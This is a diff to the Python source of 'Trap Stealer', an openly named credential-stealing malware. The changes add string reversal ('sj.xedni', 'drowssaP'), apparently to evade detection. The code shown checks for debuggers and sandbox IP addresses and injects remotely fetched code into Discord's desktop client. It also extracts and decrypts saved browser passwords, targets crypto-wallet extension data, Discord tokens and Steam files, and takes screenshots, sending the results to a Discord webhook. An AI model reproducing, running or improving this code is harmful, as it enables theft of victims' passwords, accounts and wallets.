@@ -35,7 +35,7 @@ fakeerror = False # If True it will make an fake error message at the end
 Startup = False # If True it will add the file into the startup folder
 shitty_message = False # If True it will print fake message, if you want to disable it replace with False
 antidebugging = False # If set to false it will dont check for VM or Debugger
-DiscordStop = False # If set to True it will make discord cannot be launched again by just removing content from index.js #----- IT WILL DISABLE INJECTION -----#
+DiscordStop = False # If set to True it will make discord cannot be launched again by just removing content from startup file #----- IT WILL DISABLE INJECTION -----#
 StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
 
 def antidebug():
@@ -68,7 +68,7 @@ def check_windows():
 
     while True:
         ctypes.windll.user32.EnumWindows(winEnumHandler, None)
-
+        time.sleep(0.5)
 def check_ip():
     blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}    
     while True:
@@ -198,7 +198,7 @@ try:
         pass
 except:
     pass
-
+ind = "sj.xedni"
 
 def LoadUrlib(hook, data='', files='', headers=''):
     for i in range(8):
@@ -217,7 +217,6 @@ requirements = [
 ]
 
 import requests
-from Crypto.Cipher import AES
 
 for modl in requirements:
     try: __import__(modl[0])
@@ -233,7 +232,7 @@ def NoDiscord():
         if os.path.isdir(folder_path):
             for root, dirs, files in os.walk(folder_path):
                 for file in files:
-                    if file == 'index.js' and 'discord_desktop_core-' in root:
+                    if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
                         file_path = os.path.join(root, file)
                         with open(file_path, "w+", encoding="utf-8") as f:
                             f.write('error')
@@ -248,7 +247,7 @@ except:
     pass
 
 #Do not touch
-inj_url = "https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/index.js"
+inj_url = f"https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/{ind[::-1]}"
 
 
 
@@ -259,7 +258,7 @@ def inj_discord():
         if os.path.isdir(folder_path):
             for root, dirs, files in os.walk(folder_path):
                 for file in files:
-                    if file == 'index.js' and 'discord_desktop_core-' in root:
+                    if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
                         file_path = os.path.join(root, file)
                         inj_content = urlopen(inj_url).read().decode().replace("%WEBHOOK%", webhook)
                         with open(file_path, "w", encoding="utf-8") as f:
@@ -274,6 +273,7 @@ if injection == True:
 
 else:pass
 
+pas = 'drowssaP'
 
 def systemInfo():
     system = platform.system()
@@ -282,7 +282,6 @@ def systemInfo():
     version = platform.version()
     machine = platform.machine()
     processor = platform.processor()
-    username = os.getlogin() if os.name == "nt" else os.getenv("USER")
     home_dir = os.path.expanduser("~")
 
     sys_info = f"System information:\n"\
@@ -323,19 +322,6 @@ def globalInfo():
     globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : `{gpu}` \nLatitude + Longitude  : {latitude}, {longitude} "
     return globalinfo
 
-
-def getip():
-    ip = "None"
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-            s.connect(("8.8.8.8", 80))
-            ip = s.getsockname()[0]
-    except:
-        pass
-    return ip
-
-
-ip = getip()
 globalinfo = globalInfo()
 
 
@@ -343,7 +329,6 @@ globalinfo = globalInfo()
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
-home_dir = os.path.expanduser('~')
 home_dir = os.path.expanduser('~')
 desktop_path = os.path.join(home_dir, 'Desktop')
 downloads_path = os.path.join(home_dir, 'Downloads')
@@ -634,7 +619,7 @@ def getPassw(path, arg):
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
     cursor = conn.cursor()
-    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
+    cursor.execute(f"SELECT action_url, username_value, {pas[::-1]}_value FROM logins;")
     data = cursor.fetchall()
     cursor.close()
     conn.close()
@@ -654,7 +639,7 @@ def getPassw(path, arg):
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in paswWords: paswWords.append(old)
-            Passw.append(f"URL: {row[0]} | Username: {row[1]} | Password: {DecryptValue(row[2], master_key)}")
+            Passw.append(f"URL: {row[0]} | Username: {row[1]} | {pas[::-1]}: {DecryptValue(row[2], master_key)}")
             PasswCount += 1
     writeforfile(Passw, 'passw')
 
@@ -688,10 +673,8 @@ if shitty_message == True:
 else:
     pass
 
-
 def GatherAll():
-    browserPaths = [
-        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+    browserPaths = [        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn" ],
         [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
@@ -700,12 +683,12 @@ def GatherAll():
         [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
     ]
-    discordPaths = [
-        [f"{roaming}/Discord", "/Local Storage/leveldb"],
+    discordPaths = [        [f"{roaming}/Discord", "/Local Storage/leveldb"],
         [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
         [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
         [f"{roaming}/discordptb", "/Local Storage/leveldb"],
     ]
+    Threadlist = []
     for patt in browserPaths:
         a = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
         a.start()
@@ -725,15 +708,15 @@ def GatherAll():
 
     a = upload_file(file)
     embed_fields = [{"name": f"{filename}", "value": f"[Click here to download]({a})"}]
-
+    pas = 'drowssaP'
     data = {
         "username": "Trap Stealer",
         "content": "",
         "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
         "embeds": [
             {
-                "title": "🍪 Trap Stealer Password",
-                "description": "Password",
+                "title": f"🍪 Trap Stealer {pas[::-1]}",
+                "description": f"{pas[::-1]} File URL : ",
                 "color": 0xffb6c1,
                 "fields": embed_fields,
                 "thumbnail": {
@@ -820,6 +803,7 @@ LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 user = os.path.expanduser("~")
 
 def steam_st():
+    steam_path = ""
     if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
         steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
         ssfn = []
@@ -873,7 +857,7 @@ def screen():
 
     data = {
         "username": "Trap Stealer",
-        "content": "Screen :",
+        "content": "Screen was successfully taken",
         "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
     }
 
